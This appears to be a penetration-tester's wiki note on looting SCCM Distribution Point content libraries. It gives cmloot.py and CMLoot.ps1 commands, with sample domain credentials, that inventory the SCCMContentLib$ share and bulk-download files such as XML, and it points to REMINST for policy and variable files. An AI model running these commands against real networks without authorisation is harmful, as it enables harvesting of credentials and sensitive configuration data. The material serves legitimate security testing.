---
title: SCCM Content Library
---

Domain users have read access to the `SCCMContentLib$` share on [[notes/ad/sccm]] Distribution Points.
This share often contains [[notes/windows/sensitive-files]].

Build an inventory of the content library.

=== "[[notes/tools/cmlootpy]]"
    ~~~ bash
    python3 ./cmloot.py corp.local/jdoe:'passw0rd'@sccmdp01.corp.local
    tail -f ./sccmfiles.txt
    ~~~

=== "[[notes/tools/cmloot]]"
    ~~~ powershell
    Import-Module .\CMLoot.ps1
    Invoke-CMLootInventory -SCCMHost sccmdp01.corp.local -Outfile .\sccmfiles.txt
    ~~~

Download all files with a specific extension.

=== "[[notes/tools/cmlootpy]]"
    ~~~ bash
    python3 ./cmloot.py corp.local/jdoe:'passw0rd'@sccmdp01.corp.local -cmlootdownload ./sccmfiles.txt -extensions xml
    watch -n 1 'ls -l ./CMLootOut'
    ~~~

=== "[[notes/tools/cmloot]]"
    ~~~ powershell
    Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension xml
    ~~~

Also check the `REMINST` share, especially the `SMSTemp` folder, for `.wim`, `.iso`, `variable.dat` and `policy.xml` files ([source](http://web.archive.org/web/20240213175832/https://http418infosec.com/offensive-sccm-summary)).

References:

- [Introducing cmloot.py - New tooling for attacking Configuration Manager](http://web.archive.org/web/20231007163021/https://www.shelltrail.com/research/cmloot/)
- [Looting Microsoft Configuration Manager](http://web.archive.org/web/20221201211829/https://labs.withsecure.com/publications/looting-microsoft-configuration-manager)
